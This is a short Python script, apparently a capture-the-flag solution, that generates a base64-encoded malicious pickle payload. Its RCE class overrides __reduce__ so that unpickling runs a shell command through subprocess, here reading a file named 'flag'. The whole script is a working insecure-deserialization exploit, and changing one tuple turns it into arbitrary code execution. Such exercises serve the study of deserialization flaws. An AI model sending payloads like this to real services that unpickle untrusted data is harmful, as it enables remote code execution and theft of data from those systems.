import pickle
from base64 import b64encode
import subprocess


class RCE:
    def __reduce__(self):
        cmd = ("cat", "flag")
        return subprocess.check_output, (cmd,)


if __name__ == "__main__":
    pickled = pickle.dumps(RCE())
    print(b64encode(pickled))
